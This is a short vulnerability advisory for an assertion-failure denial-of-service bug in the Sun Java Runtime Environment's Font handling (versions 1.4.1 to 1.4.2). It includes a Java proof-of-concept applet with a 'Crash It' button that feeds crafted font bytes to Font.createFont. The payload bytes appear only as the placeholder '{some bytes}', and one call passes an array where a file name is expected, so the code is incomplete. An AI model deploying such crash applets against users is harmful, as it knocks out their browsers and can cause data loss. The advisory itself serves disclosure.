source: http://www.securityfocus.com/bid/10623/info

The Sun Java Runtime Environment Font object is reportedly vulnerable to an assertion failure denial of service vulnerability. This issue is due to a failure of the process to handle exceptional conditions when processing font objects.

This issue is reported to affect Java Runtime Environment versions 1.4.1 through 1.4.2; it is likely however that other versions are also affected. This issue will crash Internet browsers running an affected Java plug-in as well.

This issue may be exploited by an attacker to cause a vulnerable application, as well as all processes spawned from the application, to crash, denying service to legitimate users. Due to the scope of the crash, data loss may occur. 

package org.illegalaccess.jvmcrash; 

import java.util.*; 
import java.applet.Applet; 
import java.awt.color.*; 
import java.awt.*; 
import java.awt.event.*; 
import java.io.*;


class BadData{public final static byte[] data =  {some bytes};} 


public class FontIPSClass extends Applet{


    class MyButtonListener implements ActionListener {
        public void actionPerformed(ActionEvent event) {
		doit(new ByteArrayInputStream(BadData.data));         	
            
        }
    }

	Hashtable files = new Hashtable(); 
	TextArea ta ;
	Button bu; 
	public FontIPSClass () throws Exception {
		initme(); 
	}

	
	public static void main(String[] a) throws Exception  {
		//System.out.println(a0+testFileExistence(a0)); 
		if (a.length > 0)  
		doit(new FileInputStream(a));
		else 
		doit(new ByteArrayInputStream(BadData.data));
	}

	
	
	private void initme() {
		ta = new TextArea ("",5, 40,
                                     TextArea.SCROLLBARS_NONE);
                add(ta);
                bu = new Button("Crash It");  
                add(bu); 
		bu.setBackground(Color.orange);
    
 		bu.addActionListener(new MyButtonListener ());               
                
		
	}
	
	private static void doit(InputStream in) {
		        	try {
		       
        	Font f = Font.createFont(Font.TRUETYPE_FONT,in); 
        	System.out.println(f.getFamily()); 
       	    	System.out.println(f.getPSName());
        	System.out.println(f.getNumGlyphs());  
        	}
               catch (Exception e) {
               	e.printStackTrace(); 
        	}

	}	
	
} 